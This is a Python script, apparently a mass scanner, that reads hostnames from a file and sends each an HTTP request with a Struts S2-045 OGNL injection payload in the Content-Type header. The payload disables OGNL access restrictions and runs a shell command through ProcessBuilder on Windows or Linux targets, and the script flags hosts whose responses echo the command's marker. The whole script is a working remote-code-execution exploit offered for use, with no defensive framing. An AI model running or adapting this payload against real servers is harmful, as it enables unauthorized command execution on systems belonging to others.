import sys
import errno, socket
import base64
import warnings
import requests
from termcolor import cprint
from requests.exceptions import ChunkedEncodingError

warnings.filterwarnings("ignore")

#################### PAYLOAD #############################
PAYLOAD = {"s2_045": str("%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo !nf@Sec').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"),}
#################### Result ##############################

struts_result = ['!nf@Sec', '0.0.0.0:0']

#################### Header ##############################

header = {'user-agent': 'ifsec@ifsec', 'Content-Type': PAYLOAD["s2_045"]}

##########################################################

Error_Message = ['Failed to establish a new connection', 'ConnectTimeoutError', "ConnectionResetError",
                 "'Remote end closed connection without response"]

##########################################################
print('URL ', 'Re_URL ', 'S_Code ', 'Struts-V ', 'Result', 'Error Message')  # Default Code

url = open("host.txt", 'r')  # Text File Read
e = ''

for line in url:
    b = line.strip('\n')
    # s2-045
    try:
        r = requests.get('http://' + b, headers=header, timeout=5, allow_redirects=True, verify=False, stream=True)
        e = ''
        if r.url == 'http://' + b:
            for d in r.iter_lines():
                e += d.decode('utf-8')
                break
            if r.status_code == 200:
                if struts_result[0] in e:
                    print(b, r.url, r.status_code, ' s2-045', ' True')
                else:
                    print(b, r.url, r.status_code, ' s2-045', ' False')
            else :
                print (b, r.url, r.status_code, 's2-045', 'False')
        else:
            r = requests.get(r.url, headers=header, timeout=5, allow_redirects=True, verify=False, stream=True)
            for d in r.iter_lines():
                e += d.decode('utf-8')
                break
            if r.status_code == 200:
                if struts_result[0] in e:
                    print(b, r.url, r.status_code, ' s2-045', ' True_R')
                else:
                    print(b, r.url, r.status_code, ' s2-045', ' False_R')
            else :
                print (b, r.url, r.status_code, 's2-045', 'False')

    except requests.ConnectionError as er:
        f = ''
        f += str(er)
        if Error_Message[0] in f:
            r = requests.get('https://' + b, headers=header, timeout=5, allow_redirects=True, verify=False,
                             stream=True)
            for d in r.iter_lines():
                e += d.decode('utf-8')
                break
            if r.status_code == 200:
                if struts_result[0] in e:
                    print(b, r.url, r.status_code, ' s2-045', ' True_ConnectionAborted')
                else:
                    print(b, r.url, r.status_code, ' s2-045', ' False_ConnectionAborted')
            else :
                print (b, r.url, r.status_code, 's2-045', 'False_ConnectionAborted')


        elif Error_Message[1] in f:
            print(b, 'ConnectTimeoutError')

        elif Error_Message[2] in f:
            print(b, 'ConnectionResetError')

        elif Error_Message[3] in f:
            print(b, 'Response Code : 0')

        else:
            print(b, 'ETC_requests.ConnectionError', f)

    except Exception as errs:
        f = ''
        f += str(errs)
        print(b, 'ETC Error', f)


